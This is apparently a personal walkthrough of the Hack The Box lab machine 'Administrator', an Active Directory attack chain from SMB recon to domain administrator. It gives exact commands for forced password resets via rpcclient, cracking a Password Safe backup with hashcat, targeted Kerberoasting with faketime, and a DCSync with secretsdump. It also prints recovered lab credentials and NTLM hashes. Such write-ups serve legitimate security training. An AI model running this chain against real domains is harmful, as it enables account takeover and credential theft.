---
title: Administrator
date: 2025-01-26
draft: false
tags:
  - htb
  - medium
---

`Username: Olivia ~ Password: ichliebedich`

# Initial Recon
### SMB recon

```
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
( LockoutTries=0 PasswordMin=7 )
```

### win-rm

By using evil-winrm we get a Powershell

`net user` → it will enumerate all users
`whoami /all` → it will provide user info , group info, user priv info and user claims unknown

# User Flag
## Bloodhound

click on user oliva (you can see that by clicking on analysis and use queries)

check node info 
→ on outbound object control header it displays the account user has First Degree Object Control(FDOC)  when we click on it 
→ it shows a way to user michael which is Generic All
⇒ means we have a permission to change password to user
michael
⇒ using evil-winrm
→ `net user michael` 

michael/domain
  → now we check **michael**
   it has also FDOC now , when we click on it 
  → it shows a way to another user who is Benjamin using force change password
  ⇒ `rpcclient -U michael <ip>`
  ⇒ `setuserinfo2  benjamin 23 ‘password’`
  → it will set new password to the `benjamin` user
  
  now on bloodhound look at the first degree group membership on group membership tab 
  → `benjamin` is a member of share moderators
  → so we can check ftp using his credentials and found Backup.psafe3 
  → `pwsafe Backup.psafe3` → to open it   
  we need  a master password to open it 
  → `hashcat -m 5200 Backup.psafe3 /rockyou.txt`
  ⇒ it will give us master password from backup.psafe3 we got creds

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb → (contains user.txt)
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
ethan:limpbizkit
```

# Root Flag
## kerberoasting

we checked **emily** user's FDOC and it directs to **ethan** which is vulnerable to **GenericWrite** 

kerberos attack where we retrieve kerberos ticket which is hash of the vulnerable user **ethan** kerberos is time-sensitive 

we used targetkerberoast.py 
```
python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

⇒ it returns with the clock-skew (time sensitive error) 
⇒ GetUserSPN.py didn't work 
⇒ ntpdate → didn't help with setting same time as target machine 
⇒ if we check nmap script result there is clock-skew {"output"⇒ “7h00m00s”}
→ which is 7 hours different from our time, so we need to add 7 hours to our time using 

## faketime
```
faketime 'now +7 hours' python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
we got the hash and we cracked it using **hashcat** 

`ethan: limpbizkit` 

## impackets
we seen that ethan FDOC is DCSync (even it has more we choose DCsync) then we used secretsdump.py from /impacket/example

```
python3 secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

if it **didn't work** we need to upgrade impacket
```
pip install --upgrade impacket
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
```


we logged in with the `hash` using `evil-winrm` 

Gained `Root` 
